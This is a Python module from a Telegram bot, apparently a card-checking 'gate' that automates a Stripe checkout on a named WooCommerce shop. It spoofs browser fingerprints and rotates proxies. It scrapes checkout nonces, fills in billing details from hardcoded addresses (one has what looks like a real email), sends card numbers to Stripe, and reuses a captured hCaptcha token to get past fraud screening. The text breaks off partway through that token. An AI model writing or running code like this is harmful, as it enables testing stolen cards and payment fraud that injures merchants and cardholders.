# BOT/gates/charge/scharge3.py

import json
import asyncio
import re
import time
import httpx
import random
import string
import os
import ssl
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import Message
import html

from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system - INTEGRATED FROM SHOPIFY.PY
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully")
except ImportError as e:
    print(f"❌ Proxy system import error: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    
    def mark_proxy_failed(proxy: str):
        pass
    
    def get_random_proxy():
        return None
    
    def parse_proxy(proxy_str: str):
        return None
    
    def test_proxy(proxy_str: str):
        return False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}", flush=True)

    def success(self, message):
        print(f"✅ {message}", flush=True)

    def warning(self, message):
        print(f"⚠️ {message}", flush=True)

    def error(self, message):
        print(f"❌ {message}", flush=True)

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}", flush=True)

    def network(self, message):
        print(f"🌐 {message}", flush=True)

    def card(self, message):
        print(f"💳 {message}", flush=True)

    def stripe(self, message):
        print(f"🔄 {message}", flush=True)

    def debug_response(self, message):
        print(f"🔧 {message}", flush=True)

    def bin_info(self, message):
        print(f"🏦 {message}", flush=True)

    def user(self, message):
        print(f"👤 {message}", flush=True)

    def proxy(self, message):
        print(f"🔗 {message}", flush=True)

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except Exception as e:
        logger.error(f"Failed to load owner ID: {e}")
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except Exception as e:
        logger.error(f"Failed to check banned users: {e}")
        return False

def check_cooldown(user_id, command_type="xs"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()

    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except Exception as e:
        logger.warning(f"Failed to load cooldowns: {e}")
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except Exception as e:
        logger.error(f"Failed to save cooldowns: {e}")

    return True, 0

class StripeCharge3Checker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://ippoipponurse.com"
        
        # Stripe keys from network data (stripe3.txt)
        self.stripe_key = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
        self.stripe_account = "acct_1O42NWCG8xnmzyo2"
        
        # Product info from network data
        self.product_url = f"{self.base_url}/shop/"
        self.product_id = "7693"  # Product ID from add_to_cart payload
        self.variation_id = None
        
        # US address data (from stripe3.txt - checkout payload)
        self.us_addresses = [
            {
                "first_name": "Billy",
                "last_name": "Mumiru",
                "address": "8 log pond drive",
                "city": "Hosham",
                "postcode": "19044",
                "phone": "",
                "state": "PA",
                "country": "US",
                "email": "caseylang222@gmail.com"
            },
            {
                "first_name": "John",
                "last_name": "Smith",
                "address": "123 Main Street",
                "city": "New York",
                "postcode": "10001",
                "phone": "2125551234",
                "state": "NY",
                "country": "US",
                "email": "john.smith@gmail.com"
            },
            {
                "first_name": "Sarah",
                "last_name": "Johnson",
                "address": "456 Oak Avenue",
                "city": "Los Angeles",
                "postcode": "90001",
                "phone": "3105555678",
                "state": "CA",
                "country": "US",
                "email": "sarah.johnson@gmail.com"
            }
        ]

        # 3D Secure patterns
        self.secure_required_patterns = [
            r'requires_action',
            r'requires_confirmation',
            r'authentication_required',
            r'3ds',
            r'3d_secure',
            r'confirm-pi',
            r'pi_[a-zA-Z0-9]+_secret_',
        ]

        # User agent for proxy
        self.user_id = user_id
        
        # Proxy management - INTEGRATED FROM SHOPIFY.PY
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"  # Default status
        self.proxy_used = False
        self.proxy_response_time = 0.0
        
        # Session storage
        self.cookies = {}
        self.checkout_nonce = None
        self.update_order_review_nonce = None
        self.woocommerce_cart_hash = None
        self.wp_woocommerce_session = None
        self.__stripe_mid = None
        self.__stripe_sid = None
        
        # httpx client
        self.client = None
        
        # Generate browser fingerprint
        self.generate_browser_fingerprint()

    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints"""
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", "1280x720"
        ]
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles"
        ]
        self.languages = [
            "en-GB,en-US;q=0.9,en;q=0.8", "en-US,en;q=0.9", "en;q=0.8"
        ]

        self.platform = "Win32"
        self.sec_ch_ua_platform = '"Windows"'
        
        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not:A-Brand";v="99", "Google Chrome";v="{version}", "Chromium";v="{version}"'
        else:
            self.sec_ch_ua = '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"'

        self.sec_ch_ua_mobile = "?0"
        self.screen_resolution = random.choice(self.screen_resolutions)
        self.timezone = random.choice(self.timezones)
        self.accept_language = random.choice(self.languages)

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿',
            'EG': '🇪🇬', 'MA': '🇲🇦'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get base headers mimicking browser"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
        }

    async def get_bin_info(self, cc):
        """Get BIN information with safe None handling"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0, verify=False, http1=True) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()
                    country_code = data.get('country', 'N/A')
                    flag_emoji = self.get_country_emoji(country_code)

                    result = {
                        'scheme': str(data.get('brand', 'N/A')).upper() if data.get('brand') else 'N/A',
                        'type': str(data.get('type', 'N/A')).upper() if data.get('type') else 'N/A',
                        'brand': str(data.get('brand', 'N/A')).upper() if data.get('brand') else 'N/A',
                        'bank': str(data.get('bank', 'N/A')).upper() if data.get('bank') else 'N/A',
                        'country': str(data.get('country_name', country_code)).upper() if data.get('country_name') else country_code,
                        'country_code': country_code,
                        'emoji': flag_emoji
                    }
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }
        self.bin_cache[bin_number] = default_response
        return default_response

    def trim_error_message(self, message):
        """Trim error message to remove unnecessary prefixes, suffixes, and trailing punctuation"""
        if not message:
            return message
        
        # Remove HTML tags first
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove "Payment Failed" prefix variations
        message = re.sub(r'^Payment\s+Failed\s*\(?\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^Payment\s+Error\s*\(?\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^Error\s*:\s*', '', message, flags=re.IGNORECASE)
        message = re.sub(r'^There\s+was\s+an\s+error\s*:\s*', '', message, flags=re.IGNORECASE)
        
        # Remove "Refresh and try again" variations
        message = re.sub(r'\.?\s*Refresh\s+and\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
        message = re.sub(r'\.?\s*Please\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
        message = re.sub(r'\.?\s*Try\s+again\.?$', '', message, flags=re.IGNORECASE)
        
        # Remove trailing periods, spaces, and parentheses
        message = re.sub(r'\)\.?$', '', message)
        message = re.sub(r'\.$', '', message)
        message = message.rstrip('. )').strip()
        
        # Remove parentheses if they wrap the entire message
        if message.startswith('(') and message.endswith(')'):
            message = message[1:-1].strip()
        
        # Clean up any double spaces
        message = re.sub(r'\s+', ' ', message).strip()
        
        return message

    def extract_error_from_html(self, html_content):
        """Extract error message from HTML response and trim it"""
        if not html_content:
            return "Payment declined"
        
        # Pattern for woocommerce error
        pattern = r'<li>\s*There was an error processing the payment:\s*(.*?)\s*<\/li>'
        match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
        if match:
            error_text = match.group(1).strip()
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            error_text = self.trim_error_message(error_text)
            return error_text
        
        # Alternative pattern
        pattern2 = r'woocommerce-error[^>]*>.*?<li>(.*?)<\/li>'
        match2 = re.search(pattern2, html_content, re.IGNORECASE | re.DOTALL)
        if match2:
            error_text = match2.group(1).strip()
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            if "there was an error processing the payment:" in error_text.lower():
                error_text = error_text.split(":", 1)[-1].strip()
            error_text = self.trim_error_message(error_text)
            return error_text
        
        return "Payment declined"

    def is_secure_required_response(self, response_data):
        """Check if the response indicates 3D Secure is required"""
        try:
            if isinstance(response_data, dict):
                redirect_url = response_data.get('redirect', '').lower()
                for pattern in self.secure_required_patterns:
                    if re.search(pattern, redirect_url):
                        return True
                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
                    return True
                response_str = str(response_data).lower()
                if 'pi_' in response_str and '_secret_' in response_str:
                    return True
        except Exception as e:
            logger.warning(f"Error checking secure response: {e}")
        return False

    def extract_nonces_from_html(self, html_content):
        """Extract all required nonces from checkout page HTML"""
        nonces = {}
        
        # Extract woocommerce-process-checkout-nonce
        checkout_nonce_match = re.search(
            r'name="woocommerce-process-checkout-nonce"\s+value="([a-f0-9]{10})"',
            html_content
        )
        if checkout_nonce_match:
            nonces['checkout_nonce'] = checkout_nonce_match.group(1)
            logger.success(f"Extracted checkout nonce: {nonces['checkout_nonce']}")
        
        # Extract update_order_review nonce (security field)
        security_match = re.search(
            r'var\s+wc_checkout_params\s*=\s*\{[^}]*"update_order_review_nonce"\s*:\s*"([a-f0-9]{10})"',
            html_content
        )
        if security_match:
            nonces['update_order_review_nonce'] = security_match.group(1)
            logger.success(f"Extracted update_order_review nonce: {nonces['update_order_review_nonce']}")
        
        # Alternative pattern for security nonce
        if 'update_order_review_nonce' not in nonces:
            alt_match = re.search(
                r'"update_order_review_nonce":"([a-f0-9]{10})"',
                html_content
            )
            if alt_match:
                nonces['update_order_review_nonce'] = alt_match.group(1)
                logger.success(f"Extracted update_order_review nonce (alt): {nonces['update_order_review_nonce']}")
        
        return nonces

    async def initialize_session(self):
        """Initialize session with proper cookies and proxy"""
        try:
            logger.step(1, 7, "Initializing session...")

            response = await self.make_request_with_retry('GET', f"{self.base_url}/")

            if response.status_code == 200:
                # Extract cookies
                if 'woocommerce_cart_hash' in response.cookies:
                    self.woocommerce_cart_hash = response.cookies['woocommerce_cart_hash']
                if 'wp_woocommerce_session' in response.cookies:
                    self.wp_woocommerce_session = response.cookies['wp_woocommerce_session']
                if '__stripe_mid' in response.cookies:
                    self.__stripe_mid = response.cookies['__stripe_mid']
                if '__stripe_sid' in response.cookies:
                    self.__stripe_sid = response.cookies['__stripe_sid']
                
                logger.success("Session initialized successfully")
                return True
            else:
                logger.error(f"Failed with status {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Session initialization error: {str(e)}")
            return False

    async def add_product_to_cart(self):
        """Add product to cart using AJAX add_to_cart endpoint"""
        try:
            logger.step(2, 7, "Adding product to cart...")

            # Visit shop page first
            await self.make_request_with_retry('GET', f"{self.base_url}/shop/")

            # Add to cart using wc-ajax endpoint
            add_to_cart_data = {
                'wc-ajax': 'add_to_cart',
                'product_sku': '',
                'product_id': self.product_id,
                'quantity': '1'
            }

            add_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/shop/",
            }

            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=add_to_cart", headers=add_headers, data=add_to_cart_data)

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('added'):
                        logger.success("Product added to cart successfully")
                        
                        # Update cart hash from response cookies
                        if 'woocommerce_cart_hash' in response.cookies:
                            self.woocommerce_cart_hash = response.cookies['woocommerce_cart_hash']
                            logger.success(f"Cart hash updated: {self.woocommerce_cart_hash}")
                        
                        return True, None
                    else:
                        return False, "Failed to add to cart"
                except:
                    return False, "Invalid response from add_to_cart"
            else:
                return False, f"Add to cart failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Add to cart error: {str(e)}")
            return False, f"Add to cart error: {str(e)}"

    async def get_checkout_page(self):
        """Load checkout page and extract nonces"""
        try:
            logger.step(3, 7, "Loading checkout page...")

            response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout-2/")

            if response.status_code != 200:
                return False, f"Failed to load checkout page: {response.status_code}"

            html_content = response.text
            
            # Extract all nonces
            nonces = self.extract_nonces_from_html(html_content)
            
            if 'checkout_nonce' in nonces:
                self.checkout_nonce = nonces['checkout_nonce']
            
            if 'update_order_review_nonce' in nonces:
                self.update_order_review_nonce = nonces['update_order_review_nonce']
            
            logger.success(f"Checkout page loaded - Checkout nonce: {self.checkout_nonce}, Update nonce: {self.update_order_review_nonce}")
            return True, None

        except Exception as e:
            logger.error(f"Checkout page error: {str(e)}")
            return False, f"Checkout page error: {str(e)}"

    async def update_order_review(self, user_info):
        """Update order review with US address"""
        try:
            logger.step(4, 7, "Updating order review...")
            
            if not self.update_order_review_nonce:
                logger.warning("Missing update_order_review_nonce, attempting to get from checkout page")
                success, error = await self.get_checkout_page()
                if not success:
                    return False, f"Failed to get checkout page: {error}"
                
                if not self.update_order_review_nonce:
                    return False, "Could not extract update_order_review_nonce from checkout page"

            # Build post_data exactly as in network data (stripe3.txt)
            current_time = datetime.now()
            session_start = current_time.strftime('%Y-%m-%d %H:%M:%S')
            
            # URL encode the user agent
            user_agent_encoded = self.user_agent.replace(' ', '%20')
            
            # Build post_data string matching the format from stripe3.txt
            post_data_str = (
                f"wc_order_attribution_source_type=typein&"
                f"wc_order_attribution_referrer=%28none%29&"
                f"wc_order_attribution_utm_campaign=%28none%29&"
                f"wc_order_attribution_utm_source=%28direct%29&"
                f"wc_order_attribution_utm_medium=%28none%29&"
                f"wc_order_attribution_utm_content=%28none%29&"
                f"wc_order_attribution_utm_id=%28none%29&"
                f"wc_order_attribution_utm_term=%28none%29&"
                f"wc_order_attribution_utm_source_platform=%28none%29&"
                f"wc_order_attribution_utm_creative_format=%28none%29&"
                f"wc_order_attribution_utm_marketing_tactic=%28none%29&"
                f"wc_order_attribution_session_entry=https%3A%2F%2Fippoipponurse.com%2F&"
                f"wc_order_attribution_session_start_time={session_start.replace(' ', '%20')}&"
                f"wc_order_attribution_session_pages=11&"
                f"wc_order_attribution_session_count=1&"
                f"wc_order_attribution_user_agent={user_agent_encoded}&"
                f"billing_first_name={user_info['first_name']}&"
                f"billing_last_name={user_info['last_name']}&"
                f"billing_company=&"
                f"billing_country={user_info['country']}&"
                f"billing_address_1={user_info['address'].replace(' ', '%20')}&"
                f"billing_address_2=&"
                f"billing_city={user_info['city']}&"
                f"billing_state={user_info['state']}&"
                f"billing_postcode={user_info['postcode']}&"
                f"billing_phone={user_info['phone'].replace(' ', '%20') if user_info['phone'] else ''}&"
                f"billing_email={user_info['email'].replace('@', '%40')}&"
                f"shipping_first_name=&"
                f"shipping_last_name=&"
                f"shipping_company=&"
                f"shipping_country={user_info['country']}&"
                f"shipping_address_1=&"
                f"shipping_address_2=&"
                f"shipping_postcode=&"
                f"shipping_city=&"
                f"shipping_state=&"
                f"order_comments=&"
                f"payment_method=woocommerce_payments&"
                f"woocommerce-process-checkout-nonce={self.checkout_nonce or ''}&"
                f"_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
            )

            post_data = {
                'wc-ajax': 'update_order_review',
                'security': self.update_order_review_nonce,
                'country': user_info['country'],
                'state': user_info['state'],
                'postcode': user_info['postcode'],
                'city': user_info['city'],
                'address': user_info['address'],
                'address_2': '',
                's_country': user_info['country'],
                's_state': user_info['state'],
                's_postcode': user_info['postcode'],
                's_city': user_info['city'],
                's_address': user_info['address'],
                's_address_2': '',
                'has_full_address': 'true',
                'post_data': post_data_str
            }

            update_headers = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout-2/",
            }

            logger.network(f"Sending update_order_review with security nonce: {self.update_order_review_nonce}")

            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)

            logger.network(f"Update order review response status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    logger.success("Order review updated successfully")
                    return True, result
                except:
                    logger.success("Order review updated (non-JSON response)")
                    return True, None
            elif response.status_code == 403:
                logger.error(f"403 Forbidden - Possible Cloudflare block or missing nonce")
                logger.warning("Retrying with fresh checkout page...")
                await asyncio.sleep(2)
                
                success, error = await self.get_checkout_page()
                if success and self.update_order_review_nonce:
                    post_data['security'] = self.update_order_review_nonce
                    response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
                    
                    if response.status_code == 200:
                        return True, None
                
                return False, f"403 Forbidden - Site may be blocking automated requests"
            else:
                return False, f"Update order review failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Update order review error: {str(e)}")
            return False, f"Update order review error: {str(e)}"

    async def create_stripe_payment_method(self, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(5, 7, "Creating payment method...")

            # Get stripe IDs from cookies or generate
            muid = self.__stripe_mid if self.__stripe_mid else f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            sid = self.__stripe_sid if self.__stripe_sid else f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            
            # Generate client session ID
            client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            
            # Format year (ensure 2-digit for expiry)
            exp_year = ano[-2:] if len(ano) == 4 else ano

            payment_data = {
                'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'billing_details[email]': user_info['email'],
                'billing_details[phone]': user_info['phone'],
                'billing_details[address][city]': user_info['city'],
                'billing_details[address][country]': user_info['country'],
                'billing_details[address][line1]': user_info['address'],
                'billing_details[address][line2]': '',
                'billing_details[address][postal_code]': user_info['postcode'],
                'billing_details[address][state]': user_info['state'],
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': exp_year,
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/e4b3a3b372; stripe-js-v3/e4b3a3b372; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(60000, 80000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_account': self.stripe_account,
                'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcyMzg5OTgwLCJjZGF0YSI6IlhmRVFXZnJlMjhGMzhrOHFnc05qaUpTV2paOVp6cEZ3RU80b0FobWwxT204RWRoSkhHMEdNWit3UG1mL2VnN08rRk53YTB4QWlOdUd2TjF0RU5haDJHNzltK05XcGx2bFc0aWZqVTA0ZFpNRHpUenBDRHprQnBQT3FYcGN3WHZMdno2QTU2aHBBajNQUVhOZGM0MWFzRGtMWThDT0FLb3c3UmVxRnpZVTg0VndFWGgvRWFUVlV1VXoxRG1zMEh4NGFqallMRHFROW9XV1NOandPUDJzZDhYZHZsZlNsbzhCdmRLMFhqMWNOb0pjaWpaVmVZMUgvNVYyOW1WNHQ1dWVPQkZnWXFyNHVzUDQyaUdxNitucUE4UVh5dEMzZGxQUXl6RFErRHBiTHdRUVBsZXFkcloreWNndmd3TnJYc1QyUWl4RHhXRks4b3FlREx6M043VUFxWk4xZ29NNWtrc0VnKzUxVXJzdDdGdz1MVDZmaUVaUmw4a0JZUWNWIiwicGFzc2tleSI6ImNuOUZpcEFOdzhDTjVJT0U0UWRwMGVzL1hzc05mSmdxTWtJUFZBaWNMbk1ZQ09ld3p1bEt4Z3h4MU41MGsrcVJEYVAzV3FlQS9qN0lVOUVvZmdIUUNFKzZ1UmVJKzZyS1k3bHU3ckxqMC9vR05GM1FoZjVsM053aDlOWHNEeFJuNVIwdlVTRzNqZDZVZjlEcGh6ekV6QjJBNTBQV0JTUFVaN24zVWJGRWE5Q1Z5SFVmUDVNSjg5VWpwUGV0R0gxanVMQkpCY3NDM21KSHMvTUZqMlZUdmNZQ3h1cjRiK2RTZ2h1YmVjdkh5NFZIOWRVNDhmQzhHOG1rNDBGRHNVY1JINTM0dDduNkJQbEl3UmxnODBSWGdUY2o2TG8zcVpvS2Z0OGFxT2w3cXJzSVZGR29SZUQ3dmhsa0k3RmRSVVlQL2xsSUh0NHczN1J0MVlHMHdRRHh5UHZjZm9UMjdhNUZudThIK1FPOVRWa3BXZVJUeTNyRE5mQ2FrV3oxVEZ4bXgwczNUREg2RTA3MGtrNTJlSnAwU0Z1SWNMYWJNVWdUZ0g3YU44cHVNVG1weGRnWXBmU215ekZDbmo0WjI1Szh3MjFZc3M1Q0JDWnlqY0JtNjNkRE0wajlBVi92VXRTZUhHZGdlS0ZzbW41alZwS3FYazdpdFVoUkRuV2s4R0ZhbGI5LzZ6M294dUhkcUg0QnY0Tkkya1V6NUhRSjJ4MEQya3FWK1VCQis5U05QRlpiNk9BQVpZU2NnUER5MTNGekxITjFDNlBGT2hyWFp1NC8xejJuNTdxV2RWaHd5N2lHRDNsN1k0ZE5hRzBMaTZXTElhRlE1aVZodG9xbE9WSHdUdjdoR0pXWEovOThIbWlKRnp1VFBZeGgrc2QwMkZxelppbmRINjFXdW0zNk50Ykk4QW8vVmx5ZWI0QmZIS3g4NTlUNzBmR0w3alhSRDdPTDR0VjZLTkxPQm1OUE0yY3g2OVN5TzNSTExzalM3SVhJSnZFT2QyV0o5SDVNaDVXeVBqWGNNcyt3bXB3V1ByWkxCZmFOeCtVTyttZ0RVbWhWOWxXTGI4RGFlc2xKSnlMeUhTanhPV2JLbXM4RTJDVlNSZzgrdlFEekNhaFRxRllDYjhtK3ZRUVAvVitKQnRxR01tSXgyRlNBN3R1Vy9ycFVaamNpdjFZdVorTnMxbXFyZnRodHE1MlV2b1NKcHFaZ0JXL3BTbUZYTHFTOUh5VytLRTY1SG1BaTExcEFNZTI4cWk2SEpycThhY2JxbHhNdGVJcmNDRm1mSmVzT0V4Q2ZsL0t6bGlSVXdmbEVnWGVNbUNJY3poN0JkN01zWTdUTmNFTzZyS2JXWkEyc3QrSnFSRmY0WGQwSUdPMjZieElFOXVYQzRHOS9qUWxzMURHbEc1RjJrK2hVaGhVVlNHbEVaUUV3N2tGRnNmNEFUVzcyWkc5d3ZRejhsdjY0bWpJTnlXMVh5d0U1djRWcVZkMitYcnU0eExybnkvY2hLSHNSdkxncUwvVjRETk1ua0JERGY5YmlrZjM0alN5SnZhUkZPWlZnYkZkVS9RcHNUcFVzdWwrQURMNUZRRUMwNFVRVFRWeG5oU0YvajFCdFdZSVNCcXdCaGxSZFdmWWxzb3JaOHR5SlRoS2Z3M1ZYL0hzMUpqcDNuZms4Q1pBUk93SlFBTDFjZEFSOGhpZzVhYVdWK3hIanZoaC9jL2RvVG00aHNXTGNucXhLeElmUXpoTEh5OVl6ZEFUN1habkFIaFpOVTh0NmgxaFR6NWs5WlA0dStmUzduRzNHTHBWU0duaWRkMk9pd0VhaEtpLzNIU0NhUFBvVDRQVTBzZ2xib2xUVXN1Z2FqMVRtcThnVUREYTRISVUrTy9RRXR0Y3VKQnFjVnZNVkw5QnRSeVJIVmFFQXg2NWk4NmI4OE9FanlXaFo3eFFHUEhSMWtEc3hMSWV2RkhUM2N0dXk0NExBRSt1cUFpN3R2aExOZUdQWHpxMFZEOTJJSWlXSzhzNlo0cDVQcmk3R2tvN3hmcEdUSHBIUDBCYktLYVZzMHJhaVF0QWIxZEhNVF